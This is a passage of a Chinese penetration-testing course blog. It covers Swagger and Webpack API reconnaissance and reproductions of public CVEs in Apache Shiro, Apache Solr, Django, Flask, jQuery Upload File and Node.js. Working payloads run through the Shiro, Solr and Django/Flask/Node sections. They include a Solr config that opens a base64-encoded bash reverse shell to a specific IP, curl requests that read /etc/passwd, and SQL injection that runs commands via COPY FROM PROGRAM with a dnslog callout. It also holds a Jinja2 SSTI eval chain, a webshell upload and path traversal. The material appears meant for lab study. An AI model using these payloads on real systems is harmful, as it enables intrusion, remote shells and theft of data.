title="#SOAP类-Swagger&amp;SoapUI&amp;EXP"></a>#SOAP类-Swagger&amp;SoapUI&amp;EXP</h4><p>Swagger：调试接口的第三方软件</p><p>探针：目录&amp;JS资源</p><p>利用：SoapUI&amp;EXP</p><p><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a></p><p><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a></p><blockquote><p>在swagger里面查找接口进行测试有无漏洞</p><p>判断是否存在：</p><p>方法一：查看js资源文件有没有存在调用swagger相关信息</p><p>方法二：目录扫描</p><p>目录：</p><p>&#x2F;swagger</p><p>&#x2F;api&#x2F;swagger</p><p>&#x2F;swagger&#x2F;ui</p><p>&#x2F;api&#x2F;swagger&#x2F;ui</p><p>&#x2F;swagger-ui.html</p><p>&#x2F;api&#x2F;swagger-ui.html</p><p>&#x2F;user&#x2F;swagger-ui.html</p><p>&#x2F;libs&#x2F;swaggerui</p><p>&#x2F;api&#x2F;swaggerui</p><p>&#x2F;swagger-resources&#x2F;configuration&#x2F;ui</p><p>&#x2F;swagger-resources&#x2F;configuration&#x2F;security</p></blockquote><p>swagger里面会有所有接口</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315233911349.png" alt="image-20230315233911349"></p><p>找到图标下的这种文件，因为这里面包含了所有接口文件的路径访问地址</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315234256309.png" alt="image-20230315234256309"></p><p>放在工具里面进行分析</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315234342846.png" alt="image-20230315234342846"></p><h6 id="工具swagger-hack（扫描swagger接口漏洞）"><a href="#工具swagger-hack（扫描swagger接口漏洞）" class="headerlink" title="工具swagger-hack（扫描swagger接口漏洞）"></a>工具swagger-hack（扫描swagger接口漏洞）</h6><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315234842684.png" alt="image-20230315234842684"></p><p>会测试所有的接口</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315235010493.png" alt="image-20230315235010493"></p><p>会在本地生成一个.csv的文件表格，查看表中的状态码200的响应包内容是否有信息泄露、未授权等</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315235317974.png" alt="image-20230315235317974"></p><h4 id="HTTP类-Webpack-amp-PackerFuzzer"><a href="#HTTP类-Webpack-amp-PackerFuzzer" class="headerlink" title="#HTTP类-Webpack&amp;PackerFuzzer"></a>#HTTP类-Webpack&amp;PackerFuzzer</h4><p> webpack 是一个用于现代 JavaScript 应用程序的 静态模块打包工具</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316002611178.png" alt="image-20230316002611178"></p><p>探针：插件&amp;JS资源</p><p>利用：PackerFuzzer</p><p>PackerFuzzer项目地址：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><blockquote><p>判断方法：</p><p>1、插件</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316001057573.png" alt="image-20230316001057573"></p><p>2、js文件关键字</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316001124159.png" alt="image-20230316001124159"></p></blockquote><h6 id="手工分析，在js的响应包里面查找关键字看能不能获取一些路径，如搜：url"><a href="#手工分析，在js的响应包里面查找关键字看能不能获取一些路径，如搜：url" class="headerlink" title="手工分析，在js的响应包里面查找关键字看能不能获取一些路径，如搜：url"></a>手工分析，在js的响应包里面查找关键字看能不能获取一些路径，如搜：url</h6><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316001345449.png" alt="image-20230316001345449"></p><h6 id="工具分析：PackerFuzzer"><a href="#工具分析：PackerFuzzer" class="headerlink" title="工具分析：PackerFuzzer"></a>工具分析：PackerFuzzer</h6><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316002113725.png" alt="image-20230316002113725"></p><p>下载js文件分析生成报告看是否有安全问题</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316001903202.png" alt="image-20230316001903202"></p><p>还可以postman配合手工测试api接口，可以修改包发送做测试</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230316003109174.png" alt="image-20230316003109174"></p>]]></content>
      
      
      <categories>
          
          <category> API攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day64 服务攻防框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr</title>
      <link href="/2023/03/13/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/"/>
      <url>/2023/03/13/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、开发框架-PHP-Laravel-Thinkphp</p><p>2、开发框架-Javaweb-St2-Spring</p><p>3、开发框架-Python-django-Flask</p><p>4、开发框架-Javascript-Node.js-JQuery</p><p>5、其他框架-Java-Apache Shiro&amp;Apache Sorl</p><p>常见语言开发框架：</p><p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等</p><p>JAVA：Spring MyBatis Hibernate Struts2 Springboot等</p><p>Python：Django Flask Bottle Turbobars Tornado Web2py等</p><p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>-中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><p>-应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="开发框架组件安全测试流程："><a href="#开发框架组件安全测试流程：" class="headerlink" title="-开发框架组件安全测试流程："></a>-开发框架组件安全测试流程：</h3><p>1、判断常见语言开发框架类型</p><p>2、判断开发框架存在的CVE问题</p><p>3、判断开发框架CVE漏洞利用方式</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Apache Shiro-组件框架安全</p><p>➢ Apache Solr-组件框架安全</p><h4 id="Apache-Shiro-组件框架安全"><a href="#Apache-Shiro-组件框架安全" class="headerlink" title="#Apache Shiro-组件框架安全"></a>#Apache Shiro-组件框架安全</h4><p>Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</p><p>判断：大多会发生在登录处，返回包里包含remeberMe&#x3D;deleteMe字段</p><p>漏洞：<a href="https://avd.aliyun.com/search?q=shiro">https://avd.aliyun.com/search?q=shiro</a></p><p>Apache Shiro &lt;&#x3D; 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</p><p>Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</p><p>Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</p><p>Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</p><p>Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</p><p>Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</p><p>Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</p><h5 id="1、CVE-2016-4437-Shiro-550-Shiro-721"><a href="#1、CVE-2016-4437-Shiro-550-Shiro-721" class="headerlink" title="1、CVE_2016_4437 Shiro-550+Shiro-721"></a>1、CVE_2016_4437 Shiro-550+Shiro-721</h5><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230314205250431.png" alt="image-20230314205250431"></p><h5 id="2、CVE-2020-11989"><a href="#2、CVE-2020-11989" class="headerlink" title="2、CVE-2020-11989"></a>2、CVE-2020-11989</h5><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315163759746.png" alt="image-20230315163759746"></p><p>Poc：&#x2F;admin&#x2F;%20</p><p>影响范围：Apache Shiro &lt; 1.7.1</p><p>靶场：<a href="https://github.com/jweny/shiro-cve-2020-17523">https://github.com/jweny/shiro-cve-2020-17523</a></p><p>访问9090</p><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315163846397.png" alt="image-20230315163846397"></p><p>输入poc，绕过登录</p><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315163954673.png" alt="image-20230315163954673"></p><h5 id="3、CVE-2020-1957"><a href="#3、CVE-2020-1957" class="headerlink" title="3、CVE-2020-1957"></a>3、CVE-2020-1957</h5><p>Poc：&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;</p><p>影响范围：Apache Shiro &lt; 1.5.3</p><h4 id="Apache-Solr-组件框架安全"><a href="#Apache-Solr-组件框架安全" class="headerlink" title="# Apache Solr-组件框架安全"></a># Apache Solr-组件框架安全</h4><p>Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</p><p>漏洞：<a href="https://avd.aliyun.com/search?q=solr">https://avd.aliyun.com/search?q=solr</a></p><p>远程命令执行RCE（CVE-2017-12629）</p><p>远程命令执行XXE（CVE-2017-12629）</p><p>任意文件读取AND命令执行（CVE-2019-17558）</p><p>远程命令执行漏洞(CVE-2019-0192)</p><p>远程命令执行漏洞(CVE-2019-0193)</p><p>未授权上传漏洞(CVE-2020-13957)</p><p>Apache Solr SSRF (CVE-2021-27905)</p><h5 id="1、远程命令执行RCE（CVE-2017-12629）"><a href="#1、远程命令执行RCE（CVE-2017-12629）" class="headerlink" title="1、远程命令执行RCE（CVE-2017-12629）"></a>1、远程命令执行RCE（CVE-2017-12629）</h5><p>Apache solr&lt;7.1.0版本</p><p>端口：8983</p><p>发送poc:</p><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315170609241.png" alt="image-20230315170609241"></p><p>反弹成功</p><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315170632850.png" alt="image-20230315170632850"></p><h5 id="2、任意文件读取AND命令执行（CVE-2019-17558）"><a href="#2、任意文件读取AND命令执行（CVE-2019-17558）" class="headerlink" title="2、任意文件读取AND命令执行（CVE-2019-17558）"></a>2、任意文件读取AND命令执行（CVE-2019-17558）</h5><p>漏洞复现：<a href="https://blog.csdn.net/weixin_43847838/article/details/122958557">(21条消息) （CVE-2017-12629）Apache Solr RCE命令执行漏洞复现_归去来兮-zangcc的博客-CSDN博客</a></p><p>Apache Solr 5.0.0版本至8.3.1</p><p>端口:8983</p><p>poc:<a href="https://github.com/jas502n/solr_rce">https://github.com/jas502n/solr_rce</a></p><p>执行：D:\Python27\python.exe solr_rce.py <a href="http://123.58.236.76:50847/">http://123.58.236.76:50847</a> id</p><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315173123225.png" alt="image-20230315173123225"></p><h5 id="3、远程命令执行漏洞-CVE-2019-0193"><a href="#3、远程命令执行漏洞-CVE-2019-0193" class="headerlink" title="3、远程命令执行漏洞(CVE-2019-0193)"></a>3、远程命令执行漏洞(CVE-2019-0193)</h5><p>端口：8983</p><p>漏洞复现：<a href="https://blog.csdn.net/weixin_45677119/article/details/111747307">(21条消息) 【漏洞复现】Apache Solr 远程命令执行漏洞（CVE-2019-0193）_Fit_Cy029的博客-CSDN博客</a></p><p>Apache Solr &lt; 8.2.0版本</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">​          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">  ]]&gt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">document</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">​    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">&quot;stackoverflow&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">​            <span class="attr">url</span>=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">​            <span class="attr">processor</span>=<span class="string">&quot;XPathEntityProcessor&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">​            <span class="attr">forEach</span>=<span class="string">&quot;/feed&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">​            <span class="attr">transformer</span>=<span class="string">&quot;script:poc&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span></span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>反弹shell成功</p><p><img src="/../images/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/image-20230315174746494.png" alt="image-20230315174746494"></p><h5 id="4、Apache-Solr-文件读取-amp-SSRF-CVE-2021-27905"><a href="#4、Apache-Solr-文件读取-amp-SSRF-CVE-2021-27905" class="headerlink" title="4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)"></a>4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)</h5><p>全版本官方拒绝修复漏洞</p><p>漏洞复现：<a href="https://www.freebuf.com/vuls/279278.html">CVE-2021-27905 Apache Solr 服务端请求伪造漏洞复现 - FreeBuf网络安全行业门户</a></p><h6 id="1、获取数据库名"><a href="#1、获取数据库名" class="headerlink" title="1、获取数据库名"></a>1、获取数据库名</h6><p><a href="http://47.94.236.117:8983/solr/admin/cores?indexInfo=false&wt=json">http://47.94.236.117:8983/solr/admin/cores?indexInfo=false&amp;wt=json</a></p><h6 id="2、访问触发"><a href="#2、访问触发" class="headerlink" title="2、访问触发"></a>2、访问触发</h6><p>curl -i -s -k -X $’POST’  -H $’Content-Type: application&#x2F;json’ –data-binary $’{&quot;set-property&quot;:{&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true}}’ $‘<a href="http://47.94.236.117:8983/solr/demo/config">http://47.94.236.117:8983/solr/demo/config</a>‘</p><h6 id="3、任意文件读取"><a href="#3、任意文件读取" class="headerlink" title="3、任意文件读取"></a>3、任意文件读取</h6><p>curl -i -s -k ‘<a href="http://47.94.236.117:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd">http://47.94.236.117:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd</a>‘</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day63 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</title>
      <link href="/2023/03/13/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/"/>
      <url>/2023/03/13/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、开发框架-PHP-Laravel-Thinkphp</p><p>2、开发框架-Javaweb-St2-Spring</p><p>3、开发框架-Python-django-Flask</p><p>4、开发框架-Javascript-Node.js-JQuery</p><p>5、其他框架-Java-Apache Shiro&amp;Apache Sor</p><p>常见语言开发框架：</p><p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等</p><p>JAVA：Spring MyBatis Hibernate Struts2 Springboot等</p><p>Python：Django Flask Bottle Turbobars Tornado Web2py等</p><p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>-中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><p>-应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><p>-开发框架组件安全测试流程：</p><p>1、判断常见语言开发框架类型</p><p>2、判断开发框架存在的CVE问题</p><p>3、判断开发框架CVE漏洞利用方式</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Python-开发框架安全-Django&amp;Flask</p><p>➢ JavaScript-开发框架安全-Jquery&amp;Node</p><h4 id="Python-开发框架安全-Django-amp-Flask"><a href="#Python-开发框架安全-Django-amp-Flask" class="headerlink" title="#Python-开发框架安全-Django&amp;Flask"></a>#Python-开发框架安全-Django&amp;Flask</h4><h5 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h5><p>Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。Django采用了MTV的框架模式，即模型M，视图V和模版T，使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能强大的第三方插件，使得Django具有较强的可扩展性。</p><h6 id="1、cve-2019-14234-较鸡肋，需要后台权限"><a href="#1、cve-2019-14234-较鸡肋，需要后台权限" class="headerlink" title="1、cve_2019_14234(较鸡肋，需要后台权限)"></a>1、cve_2019_14234(较鸡肋，需要后台权限)</h6><p>复现链接：<a href="https://cloud.tencent.com/developer/article/1549898">CVE-2019-14234：Django JSONField SQL注入漏洞复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>账号：admin 密码a123123123进入 &#x2F;admin</p><p>单引号已注入成功，SQL语句报错：</p><p>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__a%27b&#x3D;123</p><p>创建cmd_exec：</p><p>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)–%20</p><p>调用cmd_exec执行命令：</p><p>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27–%20</p><h6 id="2、CVE-2021-35042"><a href="#2、CVE-2021-35042" class="headerlink" title="2、CVE-2021-35042"></a>2、CVE-2021-35042</h6><p>复现链接：<a href="https://blog.csdn.net/weixin_43047908/article/details/119772225">(21条消息) CVE-2021-35042 Django SQL注入漏洞复现_她总是阴雨天的博客-CSDN博客</a></p><p>目录：&#x2F;vuln&#x2F;?order&#x3D;vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23</p><p>版本：&#x2F;vuln&#x2F;?order&#x3D;vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</p><p>数据库名：&#x2F;vuln&#x2F;?order&#x3D;vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23</p><h5 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h5><p>Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2 .</p><p>?name&#x3D;%7B%25%20for%20c%20in%20%5B%5D.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()%20%25%7D%0A%7B%25%20if%20c.<strong>name</strong>%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.<strong>init</strong>.<strong>globals</strong>.values()%20%25%7D%0A%20%20%7B%25%20if%20b.<strong>class</strong>%20%3D%3D%20%7B%7D.<strong>class</strong>%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</p><p>漏洞代码：</p><p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314180135171.png" alt="image-20230314180135171"></p><p>可控参数%s,这里时404_url,前面要输入个东西才可以回显（白盒漏洞，不知道参数）</p><p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314180342585.png" alt="image-20230314180342585"></p><p>换上payload，<em><strong>此处要url编码，因为是get请求，因为有空格，格式可能会出错</strong></em></p><p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314180733986.png" alt="image-20230314180733986"></p><p>执行whoami</p><p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314181029651.png" alt="image-20230314181029651"></p><h4 id="JavaScript-开发框架安全-Jquery-amp-Node"><a href="#JavaScript-开发框架安全-Jquery-amp-Node" class="headerlink" title="#JavaScript-开发框架安全-Jquery&amp;Node"></a>#JavaScript-开发框架安全-Jquery&amp;Node</h4><p>jQuery </p><h5 id="1、cve-2018-9207-cve-2018-9208-cve-2018-9209"><a href="#1、cve-2018-9207-cve-2018-9208-cve-2018-9209" class="headerlink" title="1、cve_2018_9207  cve_2018_9208 cve_2018_9209"></a>1、cve_2018_9207  cve_2018_9208 cve_2018_9209</h5><p>复现链接：<a href="https://blog.csdn.net/weixin_42675091/article/details/126675939">(21条消息) jquery 文件上传 （CVE-2018-9207）漏洞复现-CSDN博客</a></p><p>描述: jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（框架）于2006年1月由John Resig发布。</p><p>jQuery Upload File &lt;&#x3D; 4.0.2 中的任意文件上传</p><p>curl -F “myfile&#x3D;@php.php” “<a href="http://123.58.236.76:56579/jquery-upload-file/php/upload.php">http://123.58.236.76:56579/jquery-upload-file/php/upload.php</a>“</p><h5 id="1、cve-2021-21315"><a href="#1、cve-2021-21315" class="headerlink" title="1、cve_2021_21315"></a>1、cve_2021_21315</h5><p>Node.js </p><p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。</p><p>Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。</p><p>复现链接：<a href="https://www.freebuf.com/vuls/284350.html">CVE-2021-21315 NodeJs命令注入漏洞复现 - FreeBuf网络安全行业门户</a></p><p>Systeminformation &lt;  5.3.1</p><p>git clone <a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git</a></p><p>node index.js</p><p>&#x2F;api&#x2F;getServices?name[]&#x3D;$(echo -e ‘xiaodi’ &gt; test.txt)</p><p>2、cve_2017_14849</p><p>GET：</p><p>&#x2F;static&#x2F;..&#x2F;..&#x2F;..&#x2F;a&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP</title>
